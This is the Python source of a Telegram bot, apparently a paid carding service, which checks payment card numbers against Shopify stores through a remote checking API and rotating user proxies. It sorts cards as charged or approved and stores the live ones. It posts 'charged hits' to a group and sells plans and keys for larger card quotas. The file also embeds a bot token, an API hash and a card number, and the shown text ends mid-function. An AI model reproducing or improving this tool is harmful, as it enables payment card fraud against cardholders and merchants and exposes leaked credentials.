from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml
import random, datetime, json, os, re, asyncio, time
import string
import tempfile
import aiohttp
import aiofiles
from urllib.parse import urlparse, quote

# Import database
from database import (
    init_db, db,
    ensure_user, get_user_plan, set_user_plan, is_premium_user,
    is_banned_user, ban_user, unban_user,
    create_key, get_key_data, use_key, get_all_keys,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_site_db, get_user_sites, remove_site_db,
    save_card_to_db, get_total_cards_count, get_charged_count, get_approved_count,
    get_all_premium_users, get_total_users, get_premium_count,
    get_total_sites_count, get_users_with_sites, get_sites_per_user, get_all_sites_detail
)


# Config (override via environment variables)
API_ID = int(os.getenv("API_ID", "36442788"))
API_HASH = os.getenv("API_HASH", "a46cfef94ef9de4026597c6a4addf073")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8710395950:AAEH9E_ip9dOLqM76p_zb1113o0ubBw_qGY")
ADMIN_ID = json.loads(os.getenv("ADMIN_ID", "[6598607558]"))
GROUP_ID = int(os.getenv("GROUP_ID", "-1003684602999"))

# API Base URL — UPDATED TO NEW ENDPOINT
API_BASE_URL = os.getenv("API_BASE_URL", "https://python-version-production-3ddc.up.railway.app/shopify")

ACTIVE_MTXT_PROCESSES = {}
TEMP_WORKING_SITES = {}
USER_APPROVED_PREF = {}

# Custom emoji pack: Udif7rr7_by_fStikBot
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
CE = {
    "crown":  5039727497143387500,   # ?? title/premium
    "bolt":   5042334757040423886,   # ? checker cmds
    "brain":  5040030395416969985,   # ?? management
    "shield": 5042328396193864923,   # ?? proxy
    "star":   5042176294222037888,   # ? status
    "gem":    5042050649248760772,   # ?? charged
    "check":  5039793437776282663,   # ? approved
    "fire":   5039644681583985437,   # ?? hit
    "party":  5039778134807806727,   # ?? complete
    "search": 5039649904264217620,   # ?? /sh
    "chart":  5042290883949495533,   # ?? /msh
    "pin":    5039600026809009149,   # ?? /mtxt
    "joker":  5039998939076494446,   # ?? /ran
    "plus":   5039891861246838069,   # ? /add
    "cross":  5040042498634810056,   # ? /rm
    "info":   5042306247047513767,   # ?? /info
    "gift":   5041975203853239332,   # ?? /redeem
    "eyes":   5039623284056917259,   # ?? proxy view
    "trash":  5039614900280754969,   # ?? /rmpxy
    "tick":   5039844895779455925,   # ?? /chkpxy
    "stop":   5039671744172917707,   # ?? banned/stop
    "warn":   5039665997506675838,   # ?? warning
    "link":   5042101437237036298,   # ?? link/site
    "globe":  5042186567783809934,   # ?? site checker
}
PE = "⭐"  # placeholder emoji for CustomEmoji entities (must be a real emoji, U+2B50)
# ====================== PLAN & ACCESS SYSTEM ======================

# ====================== PLAN & ACCESS SYSTEM ======================

async def get_user_access(event):
    user_id = event.sender_id
    await ensure_user(user_id)
    if await is_banned_user(user_id):
        return False, "banned", "free"
    plan = await get_user_plan(user_id)
    is_private = event.chat.id == user_id
    return True, f"{plan}_private" if is_private else f"{plan}_group", plan

async def can_use(user_id, chat):
    """Check if a user can use the bot. Returns (can_use_bool, access_type)."""
    if await is_banned_user(user_id):
        return False, "banned"
    plan = await get_user_plan(user_id)
    is_private = chat.id == user_id
    access_type = f"{plan}_private" if is_private else f"{plan}_group"
    return True, access_type

def get_cc_limit(plan: str, user_id=None):

    if user_id and user_id in ADMIN_ID:
        return 5000
    limits = {"free": 300, "pro": 2000, "toji": 5000}
    return limits.get(plan.lower(), 300)

# ====================== PLAN KEY MANAGEMENT SYSTEM ======================

async def create_plan_key(key, plan_type, days):
    """Create a key for a specific plan type"""
    try:
        await db.execute(
            "INSERT INTO keys (key, plan_type, days, used, used_by, used_at, created_at) VALUES ($1, $2, $3, FALSE, NULL, NULL, NOW())",
            key, plan_type, days
        )
        return True
    except Exception as e:
        print(f"Error creating plan key: {e}")
        return False


async def use_plan_key(user_id, key):
    """Redeem a plan key and activate the plan for user"""
    try:
        row = await db.fetchrow(
            "SELECT plan_type, days, used FROM keys WHERE key = $1",
            key
        )

        if not row:
            return False, "Invalid key!"

        plan_type, days, used = row['plan_type'], row['days'], row['used']

        if used:
            return False, "Key already used!"

        # Mark key as used
        await db.execute(
            "UPDATE keys SET used = TRUE, used_by = $1, used_at = NOW() WHERE key = $2",
            user_id, key
        )

        # Set user plan
        await set_user_plan(user_id, plan_type, days)

        return True, f"{plan_type.upper()} plan activated for {days} days!"
    except Exception as e:
        print(f"Error using plan key: {e}")
        return False, f"Error: {e}"


async def get_all_plan_keys(limit=50):
    """Get all plan keys from database"""
    try:
        rows = await db.fetch(
            "SELECT key, plan_type, days, used, used_by, created_at FROM keys ORDER BY created_at DESC LIMIT $1",
            limit
        )
        return rows
    except Exception as e:
        print(f"Error getting plan keys: {e}")
        return []


async def delete_plan_key(key):
    """Delete a plan key from database"""
    try:
        await db.execute("DELETE FROM keys WHERE key = $1", key)
        return True
    except Exception as e:
        print(f"Error deleting plan key: {e}")
        return False


client_instance = None
def _utf16_offset(text, py_pos):
    """Convert Python string position to UTF-16 code unit offset."""
    return len(text[:py_pos].encode('utf-16-le')) // 2

def _build_entities(html_text, emoji_ids=None):
    """Parse HTML and add custom emoji entities at ? positions.
    thtml.parse() already returns UTF-16 offsets matching Telegram's API."""
    text, entities = thtml.parse(html_text)

    # Add custom emoji entities at ? positions (UTF-16 offsets)
    if emoji_ids:
        idx = 0
        utf16_pos = 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]
                ))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1

    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    text, entities = _build_entities(html_text, emoji_ids)
    msg = await event.reply(text, formatting_entities=entities, buttons=buttons, file=file)
    return msg

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None):
    text, entities = _build_entities(html_text, emoji_ids)
    msg = await client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons)
    return msg

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    text, entities = _build_entities(html_text, emoji_ids)
    await msg.edit(text, formatting_entities=entities, buttons=buttons)

async def api_delete(chat_id, msg_id):
    async with aiohttp.ClientSession() as session:
        await session.post(f"{BOT_API}/deleteMessage", json={"chat_id": chat_id, "message_id": msg_id})


def pbtn(text, data=None, url=None):
    if url:
        return Button.url(text, url)
    if data:
        return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")


# --- Utility Functions ---

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))


async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200:
                    return "BIN Info Not Found", "-", "-", "-", "-", "???"
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '???')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return "-", "-", "-", "-", "-", "???"
    except Exception:
        return "-", "-", "-", "-", "-", "???"


def normalize_card(text):
    if not text:
        return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16:
            cc = part
        elif len(part) == 4 and part.startswith('20'):
            yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '':
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':
            yy = part
        elif len(part) in [3, 4] and cvv == '':
            cvv = part
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None


def extract_json_from_response(response_text):
    if not response_text:
        return None
    start_index = response_text.find('{')
    if start_index == -1:
        return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{':
            brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1:
        return None
    json_text = response_text[start_index:end_index + 1]
    try:
        return json.loads(json_text)
    except json.JSONDecodeError:
        return None


async def get_user_proxy(user_id):
    """Get a random proxy for a specific user from DB"""
    return await get_random_proxy(user_id)


async def remove_dead_proxy(user_id, proxy_url):
    """Remove a dead proxy from user's list in DB"""
    await remove_proxy_by_url(user_id, proxy_url)


def build_api_url(site, cc, proxy_data=None):
    """Build the full API URL with parameters - UPDATED TO NEW ENDPOINT"""
    
    if not site.startswith('http'):
        site = f'https://{site}'

    # Encode parameters properly
    encoded_site = quote(site, safe='')
    encoded_cc = quote(cc, safe='')

    # Base URL - NEW ONE YOU PROVIDED
    base_url = "https://python-version-production-3ddc.up.railway.app/shopify"

    url = f'{base_url}?site={encoded_site}&cc={encoded_cc}'

    # Add proxy if available
    if proxy_data:
        ip = proxy_data.get('ip')
        port = proxy_data.get('port')
        username = proxy_data.get('username')
        password = proxy_data.get('password')

        if username and password:
            proxy_str = f"{ip}:{port}:{username}:{password}"
        else:
            proxy_str = f"{ip}:{port}"

        encoded_proxy = quote(proxy_str, safe='')
        url += f'&proxy={encoded_proxy}'

    return url



# ---- ONLY WORKING SITES KEYWORDS ----
# Jo match karega → Working (Charged/Approved)
# Jo match nahi karega → Dead
WORKING_KEYWORDS = [
    "order_paid",
    "order_placed",
    "order confirmed",
    "thank you",
    "payment successful",
    "order completed",
    "charged",
    "order_created",
    "order_placed_successfully",
    "success",
    "approved",
    "otp_required",
    "3d_authentication",
    "3ds_required",
    "authentication_required",
    "insufficient_funds",      # sometimes treated as live
    "cvc",
    "ccn",
    "ccn live",
    "cvv live"
]


def classify_api_response(response_json):
    api_response = str(response_json.get('Response', ''))
    api_status = response_json.get('Status', False)
    price = response_json.get('Price', '-')
    gateway = response_json.get('Gate', response_json.get('Gateway', 'Shopify'))

    if price is not None and price != '-':
        price = f"${price}"

    response_lower = api_response.lower()

    # New Logic: Sirf working keywords se decide
    if any(kw in response_lower for kw in WORKING_KEYWORDS):
        # Charged check
        charged_keywords = ["order_paid", "order_placed", "order confirmed", "thank you", "payment successful", "order completed", "charged", "order_created"]
        if any(kw in response_lower for kw in charged_keywords):
            return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Charged"}
        
        # Approved (3DS, OTP, etc.)
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Approved"}

    # Agar koi working keyword nahi mila → Dead
    return {
        "Response": api_response or "No working keyword found",
        "Price": price,
        "Gateway": gateway,
        "Status": "SiteError"
    }


async def call_shopify_api(site, cc, proxy_data=None):
    """Central function to call the Shopify API"""
    url = build_api_url(site, cc, proxy_data)

    timeout = aiohttp.ClientTimeout(total=60)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(url) as res:
            if res.status != 200:
                return None, f"HTTP_ERROR_{res.status}"

            try:
                response_json = await res.json()
                return response_json, None
            except Exception:
                response_text = await res.text()
                # Try to extract JSON from response text
                extracted = extract_json_from_response(response_text)
                if extracted:
                    return extracted, None
                return None, f"Invalid JSON: {response_text[:100]}"


async def check_card_random_site(card, sites, user_id=None):
    if not sites:
        return {"Response": "ERROR", "Price": "-", "Gateway": "-", "Status": "Error"}, -1
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1

    proxy_data = await get_user_proxy(user_id) if user_id else None

    try:
        response_json, error = await call_shopify_api(selected_site, card, proxy_data)

        if error:
            return {"Response": error, "Price": "-", "Gateway": "-", "Status": "SiteError"}, site_index

        result = classify_api_response(response_json)
        return result, site_index

    except asyncio.TimeoutError:
        return {"Response": "API Timeout (60s)", "Price": "-", "Gateway": "-", "Status": "SiteError"}, site_index
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-", "Status": "SiteError"}, site_index


async def check_card_specific_site(card, site, user_id=None):
    proxy_data = await get_user_proxy(user_id) if user_id else None

    try:
        response_json, error = await call_shopify_api(site, card, proxy_data)

        if error:
            return {"Response": error, "Price": "-", "Gateway": "-", "Status": "SiteError"}

        # Proxy death check removed - just classify response directly
        result = classify_api_response(response_json)
        return result

    except asyncio.TimeoutError:
        return {"Response": "API Timeout (60s)", "Price": "-", "Gateway": "-", "Status": "SiteError"}
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-", "Status": "SiteError"}


async def check_card_with_retry(card, sites, user_id=None, max_retries=3):
    for attempt in range(max_retries):
        if not sites:
            return {"Response": "No sites available", "Price": "-", "Gateway": "-", "Status": "Error"}, -1

        selected_site = random.choice(sites)
        site_index = sites.index(selected_site) + 1

        result = await check_card_specific_site(card, selected_site, user_id)

        if result.get("Status") == "SiteError":
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
            else:
                result["Status"] = "Error"
                return result, site_index

        return result, site_index

    return {"Response": "Max retries exceeded", "Price": "-", "Gateway": "-", "Status": "Error"}, -1


async def check_card_specific_with_retry(card, site, user_id=None, all_sites=None, max_retries=3):
    last_result = None

    for attempt in range(max_retries):
        if attempt == 0:
            use_site = site
        elif all_sites:
            use_site = random.choice(all_sites)
        else:
            use_site = site

        result = await check_card_specific_site(card, use_site, user_id)
        last_result = result

        if result.get("Status") == "SiteError":
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
            else:
                result["Status"] = "Error"
                return result

        return result

    if last_result:
        last_result["Status"] = "Error"
        return last_result
    return {"Response": "Max retries exceeded", "Price": "-", "Gateway": "-", "Status": "Error"}


def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)


def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card:
            cards.add(card)
    return list(cards)




async def save_approved_card(card, status, response, gateway, price):
    try:
        await save_card_to_db(card, status, response or '', gateway or '', price or '')
    except Exception as e:
        print(f"Error saving card to DB: {str(e)}")


async def pin_charged_message(event, message):
    try:
        if event.is_group:
            await message.pin()
    except Exception as e:
        print(f"Failed to pin message: {e}")


async def send_hit_notification(client_instance, card, result, username, user_id):
    try:
        price = result.get('Price', '-')
        response = result.get('Response', '-')
        gateway = result.get('Gateway', 'Shopify')
        status = result.get('Status', 'Charged')

        hit_msg = f"""{PE} CHARGED HIT {PE}
━━━━━━━━━━━━━━━━━
Response ━ {response}
Gateway ━ {gateway}
Price ━ {price}
━━━━━━━━━━━━━━━━━
User ━ @{username}"""

        try:
            await styled_send(GROUP_ID, hit_msg, emoji_ids=[CE["fire"], CE["fire"]])
        except Exception as e:
            print(f"Failed to send hit to group: {e}")

    except Exception as e:
        print(f"Error sending hit notification: {e}")


def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
        except Exception:
            return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))


def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line):
            clean_urls.add(cleaned_line)
    return list(clean_urls)


def parse_proxy_format(proxy):
    proxy = proxy.strip()
    proxy_type = 'http'

    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)

    host = ''
    port = ''
    username = ''
    password = ''

    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        potential_host, potential_port, potential_user, potential_pass = match.groups()
        if 0 < int(potential_port) <= 65535:
            host, port, username, password = potential_host, potential_port, potential_user, potential_pass
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        return None

    if not host or not port:
        return None

    try:
        port_num = int(port)
        if port_num <= 0 or port_num > 65535:
            return None
    except ValueError:
        return None

    if username and password:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
        else:
            proxy_url = f'http://{username}:{password}@{host}:{port}'
    else:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{host}:{port}'
        else:
            proxy_url = f'http://{host}:{port}'

    return {
        'ip': host,
        'port': port,
        'username': username if username else None,
        'password': password if password else None,
        'proxy_url': proxy_url,
        'type': proxy_type
    }


async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except Exception as e:
        return False, str(e)


async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    try:
        proxy_data = await get_user_proxy(user_id) if user_id else None

        response_json, error = await call_shopify_api(site, test_card, proxy_data)

        if error:
            return {"status": "dead", "response": error, "site": site, "price": "-"}

        response_msg = response_json.get("Response", "")

        if not is_site_error(response_msg):   # ← yeh line change ho gayi
            return {"status": "working", "response": response_msg, "site": site, "price": response_json.get("Price", "-")}
        else:
            return {"status": "dead", "response": response_msg, "site": site, "price": "-"}

    except asyncio.TimeoutError:
        return {"status": "dead", "response": "Timeout (60s)", "site": site, "price": "-"}
    except Exception as e:
        return {"status": "dead", "response": str(e), "site": site, "price": "-"}


def get_status_header(status):
    """Returns (header_text, emoji_ids_list)"""
    if status == "Charged":
        return (f"{PE} CHARGED {PE}", [CE["gem"], CE["gem"]])
    elif status == "Approved":
        return (f"{PE} APPROVED {PE}", [CE["check"], CE["check"]])
    elif status == "Proxy Dead":
        return (f"{PE} PROXY DEAD {PE}", [CE["warn"], CE["warn"]])
    elif status == "Error" or status == "SiteError":
        return (f"{PE} ERROR {PE}", [CE["cross"], CE["cross"]])
    else:
        return (f"{PE} DECLINED {PE}", [CE["cross"], CE["cross"]])


client = TelegramClient('cc_bot', API_ID, API_HASH)


def banned_user_message():
    text = f"{PE} <b>BANNED</b>\n\n━━━━━━━━━━━━━━━\nYou are not allowed to use this bot.\n\n{PE} Appeal ━ @MRROOTTG"
    emojis = [CE["stop"], CE["star"]]
    return text, emojis


# --- Bot Command Handlers ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    print(f"[START] from {event.sender_id}", flush=True)
    try:
        await ensure_user(event.sender_id)
        _, access_type = await can_use(event.sender_id, event.chat)
        if access_type == "banned":
            ban_text, ban_emojis = banned_user_message()
            return await styled_reply(event, ban_text, emoji_ids=ban_emojis)

        if access_type in ["premium_private", "premium_group"]:
            status_line = f"{PE} <b>STATUS</b> ━ Premium {PE} (<code>{get_cc_limit(access_type, event.sender_id)}</code> CCs)"
            status_emojis = [CE["star"], CE["crown"]]
        else:
            status_line = f"<b>STATUS</b> ━ Free Tier ━ (<code>{get_cc_limit(access_type, event.sender_id)}</code> CCs)"
            status_emojis = []

        text = f"""{PE} <b><i>Checker Commands</i></b>
|   {PE} <code>/sh</code> ━ Single CC check
|   {PE} <code>/msh</code> ━ Multi CC from text
|   {PE} <code>/mtxt</code> ━ Mass CC from <code>.txt</code> file
|   {PE} <code>/ran</code> ━ Mass CC with random sites

{PE} <b><i>Management</i></b>
|   {PE} <code>/add</code> ━ Add site(s) to your DB
|   {PE} <code>/rm</code> ━ Remove site(s) from DB
|   {PE} <code>/check</code> ━ Test saved sites
|   {PE} <code>/info</code> ━ Your profile &amp; stats
|   {PE} <code>/redeem</code> ━ Redeem a premium key
|   {PE} <code>/plan</code>  ━ plans
{PE} <b>Proxy</b> (Private Only)
|   {PE} <code>/addpxy</code> ━ Add proxy (max 10)
|   {PE} <code>/proxy</code> ━ View saved proxies
|   {PE} <code>/chkpxy</code> ━ Test proxy status
|   {PE} <code>/rmpxy</code> ━ Remove proxy

{status_line}"""

        kb = [
            [pbtn("💎 Plans", data="plans"), pbtn("📞 Support", url="https://t.me/MRROOTTG")],
        ]
        start_emojis = [
            CE["bolt"],
            CE["search"], CE["chart"], CE["pin"], CE["joker"],
            CE["brain"],
            CE["plus"], CE["cross"], CE["globe"], CE["info"], CE["gift"],
            CE["shield"],
            CE["link"], CE["eyes"], CE["tick"], CE["trash"],CE["bolt"]
        ] + status_emojis
        await styled_reply(event, text, buttons=kb, emoji_ids=start_emojis)
    except Exception as e:
        print(f"[START ERROR] {e}", flush=True)
        await event.reply(f"Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    current_plan = await get_user_plan(event.sender_id)
    text =f"""{PE}<b>AVAILABLE PLANS{PE}</b>
━━━━━━━━━━━━━━━━━
{PE} <b>FREE</b>   → 300 CCs (Group only)
{PE} <b>PRO</b>    → 1000 CCs + Proxy + Private
{PE} <b>TOJI</b>   → 5000 CCs + Priority + Lifetime
━━━━━━━━━━━━━━━━━

Current: <b>{current_plan.upper()}</b>
Contact @MRROOTTG to upgrade"""
    kb = [[pbtn("💰 Upgrade Now", url="https://t.me/MRROOTTG")]]
    await styled_reply(event, text, buttons=kb, emoji_ids=[CE["crown"], CE["fire"], CE["gem"]])

@client.on(events.NewMessage(pattern='/setplan'))
async def setplan_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} <b>Admin only</b>", emoji_ids=[CE["stop"]])
    try:
        parts = event.raw_text.split()
        user_id = int(parts[1])
        plan = parts[2].lower()
        days = int(parts[3]) if len(parts) > 3 else 0
        if plan not in ["free", "pro", "toji"]:
            return await styled_reply(event, "Plan must be free/pro/toji", emoji_ids=[CE["cross"]])
        await set_user_plan(user_id, plan, days)
        await styled_reply(event, f"✅ User {user_id} plan set to **{plan.upper()}**", emoji_ids=[CE["check"]])
    except:
        await styled_reply(event, "Usage: /setplan <user_id> <free|pro|toji> [days]", emoji_ids=[CE["warn"]])

@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} <b>Admin only</b>", emoji_ids=[CE["stop"]])
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            return await styled_reply(event, f"{PE} Format: /auth user_id days", emoji_ids=[CE["warn"]])
        user_id = int(parts[1])
        days = int(parts[2])
        await ensure_user(user_id)
        await add_premium_user(user_id, days)
        await styled_reply(event, f"{PE} User {user_id} granted {days} days premium", emoji_ids=[CE["check"]])
        try:
            await styled_send(user_id, f"{PE} <b>Premium Activated</b>\n━━━━━━━━━━━━━━━━━\n━ Duration: {days} days\n━ Limit: 3000 CCs\n━ Private chat unlocked", emoji_ids=[CE["crown"]])
        except Exception:
            pass
    except ValueError:
        await styled_reply(event, f"{PE} Invalid user ID or days", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} <b>Admin only</b>", emoji_ids=[CE["stop"]])
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            return await styled_reply(event, f"{PE} Format: /key amount days", emoji_ids=[CE["warn"]])
        amount = int(parts[1])
        days = int(parts[2])
        if amount > 10:
            return await styled_reply(event, f"{PE} Max 10 keys at once", emoji_ids=[CE["cross"]])
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            await create_key(key, days)
            generated_keys.append(key)
        keys_text = "\n".join([f"{PE} <code>{key}</code>" for key in generated_keys])
        await styled_reply(event, f"{PE} Generated {amount} key(s) for {days} day(s):\n\n{keys_text}", emoji_ids=[CE["gift"]] + [CE["gem"]] * len(generated_keys))
    except ValueError:
        await styled_reply(event, f"{PE} Invalid amount or days", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key_cmd(event):
    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await styled_reply(
                event, 
                f"{PE} <b>Usage:</b> <code>/redeem KEY</code>\n\n"
                f"Redeem your plan key to activate premium features.",
                emoji_ids=[CE["warn"]]
            )
        
        key = parts[1].upper()
        await ensure_user(event.sender_id)
        
        # Check if user already has premium
        current_plan = await get_user_plan(event.sender_id)
        if current_plan in ["pro", "toji"]:
            return await styled_reply(
                event, 
                f"{PE} You already have <b>{current_plan.upper()}</b> plan active!\n\n"
                f"Cannot redeem another key while premium is active.",
                emoji_ids=[CE["crown"]]
            )
        
        # Try to use the plan key
        success, result = await use_plan_key(event.sender_id, key)
        
        if not success:
            return await styled_reply(event, f"{PE} {result}", emoji_ids=[CE["cross"]])
        
        # Parse plan info from result
        plan_info = result.split(" plan")[0].upper()
        
        # Get plan limits
        if "PRO" in plan_info:
            cc_limit = 1000
            plan_display = "💎 PRO"
            plan_emoji = CE["gem"]
        elif "TOJI" in plan_info:
            cc_limit = 5000
            plan_display = "👑 TOJI"
            plan_emoji = CE["crown"]
        else:
            cc_limit = 300
            plan_display = "🆓 FREE"
            plan_emoji = CE["star"]
        
        response = f"""{PE} <b>Plan Activated Successfully!</b>
━━━━━━━━━━━━━━━━━
Plan: {plan_display}
━━━━━━━━━━━━━━━━━
✓ CC Limit: <code>{cc_limit}</code>
✓ Proxy Support: Yes (max 100)
✓ Private Chat: Unlocked
━━━━━━━━━━━━━━━━━
{PE} Use <code>/info</code> to see your profile
{PE} Add proxies with <code>/addpxy</code>
{PE} Add sites with <code>/add</code>

{PE} Enjoy your {plan_display} plan!"""

        await styled_reply(event, response, emoji_ids=[plan_emoji, CE["check"], CE["star"]])
        
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    try:
        add_text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if not add_text:
            return await styled_reply(event, f"{PE} Format: /add site.com site.com", emoji_ids=[CE["warn"]])
        sites_to_add = extract_urls_from_text(add_text)
        if not sites_to_add:
            return await styled_reply(event, f"{PE} No valid urls/domains found", emoji_ids=[CE["cross"]])

        await ensure_user(event.sender_id)
        added_sites = []
        already_exists = []
        for site in sites_to_add:
            success = await add_site_db(event.sender_id, site)
            if success:
                added_sites.append(site)
            else:
                already_exists.append(site)

        response_parts = []
        emoji_ids = []
        if added_sites:
            response_parts.append("\n".join(f"{PE} Added: {s}" for s in added_sites))
            emoji_ids.extend([CE["check"]] * len(added_sites))
        if already_exists:
            response_parts.append("\n".join(f"{PE} Exists: {s}" for s in already_exists))
            emoji_ids.extend([CE["warn"]] * len(already_exists))
        if response_parts:
            await styled_reply(event, "\n\n".join(response_parts), emoji_ids=emoji_ids)
        else:
            await styled_reply(event, f"{PE} No new sites to add", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def remove_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    try:
        rm_text = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if not rm_text:
            return await styled_reply(event, f"{PE} Format: /rm site.com", emoji_ids=[CE["warn"]])
        sites_to_remove = extract_urls_from_text(rm_text)
        if not sites_to_remove:
            return await styled_reply(event, f"{PE} No valid urls/domains found", emoji_ids=[CE["cross"]])

        removed_sites = []
        not_found_sites = []
        for site in sites_to_remove:
            success = await remove_site_db(event.sender_id, site)
            if success:
                removed_sites.append(site)
            else:
                not_found_sites.append(site)

        response_parts = []
        emoji_ids = []
        if removed_sites:
            response_parts.append("\n".join(f"{PE} Removed: {s}" for s in removed_sites))
